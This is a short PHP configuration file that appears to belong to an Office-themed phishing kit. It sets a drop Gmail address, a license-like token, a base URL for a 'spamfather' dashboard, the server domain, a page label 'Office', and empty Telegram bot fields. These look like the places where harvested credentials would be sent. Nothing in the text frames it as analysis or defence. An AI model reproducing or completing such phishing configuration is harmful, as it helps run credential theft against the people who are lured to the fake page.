<?php
$email ="officecookies3@gmail.com";
$token ="7F687-767CC-F20FC-EA1C9-DC4A5-ADC23-26-16-89589-437";
$base  ="https://dashboard.spamfather.com/web/";
$domain= $server=$_SERVER['SERVER_NAME'];
$page="Office";
$telegramId=" ";
$telegarmToken=" ";
?>